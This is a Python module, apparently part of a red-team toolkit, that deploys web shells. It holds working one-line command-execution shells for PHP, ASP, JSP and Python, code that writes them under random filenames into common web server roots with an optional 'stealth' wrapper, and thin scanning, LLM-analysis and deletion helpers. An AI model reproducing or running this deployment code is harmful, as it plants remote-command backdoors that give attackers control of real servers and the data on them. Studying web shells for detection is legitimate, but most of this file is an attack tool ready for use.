"""
web_shell/deployer.py
Advanced Web Shell Deployment Utility with Ethical Red + Blue Team Capabilities
"""

import os
import shutil
import subprocess
import random
import string
from datetime import datetime
from utils.logger import logger
from utils.async_tools import run_async_command
from llm.offline_chat import analyze_with_ai, get_ai_summary

WEB_SHELLS = {
    "php": "<?php echo shell_exec($_GET['cmd']); ?>",
    "asp": "<% eval request(\"cmd\") %>",
    "jsp": "<%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    "py": "import os\nos.system(input('cmd: '))",
}

DEPLOY_PATHS = ["/var/www/html", "/srv/http", "/usr/share/nginx/html"]


def generate_shell_code(language="php", stealth=False):
    code = WEB_SHELLS.get(language.lower(), WEB_SHELLS["php"])
    if stealth:
        code = f"<!-- WebShell --!>\n{code}\n<!-- EndShell -->"
    return code


def generate_random_filename(extension):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}.{extension}"


def deploy_shell(language="php", stealth=True, deploy_path=None):
    shell_code = generate_shell_code(language, stealth)
    filename = generate_random_filename(language)

    # Choose a valid path
    path = deploy_path if deploy_path else next((p for p in DEPLOY_PATHS if os.path.exists(p)), None)
    if not path:
        logger.error("No valid web root path found to deploy shell.")
        return None

    filepath = os.path.join(path, filename)
    with open(filepath, 'w') as f:
        f.write(shell_code)

    logger.info(f"[+] Web shell deployed at: {filepath}")
    return filepath


def delete_shell(filepath):
    try:
        os.remove(filepath)
        logger.info(f"[-] Shell removed from: {filepath}")
    except Exception as e:
        logger.warning(f"[!] Failed to delete shell: {e}")


def scan_for_webshells(base_dir):
    found = []
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if any(file.endswith(ext) for ext in WEB_SHELLS):
                full_path = os.path.join(root, file)
                with open(full_path, 'r', errors='ignore') as f:
                    content = f.read()
                    for pattern in WEB_SHELLS.values():
                        if pattern.split()[0] in content:
                            found.append(full_path)
    return found


def analyze_webshell_with_ai(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()
        summary = get_ai_summary(content)
        logger.info(f"[AI Summary] {summary}")
        return summary
    except Exception as e:
        logger.error(f"[!] Failed to analyze webshell: {e}")
        return None


def main():
    # Example CLI usage
    deployed = deploy_shell(language="php", stealth=True)
    if deployed:
        analyze_webshell_with_ai(deployed)
        input("\nPress Enter to delete shell...")
        delete_shell(deployed)


if __name__ == "__main__":
    main()
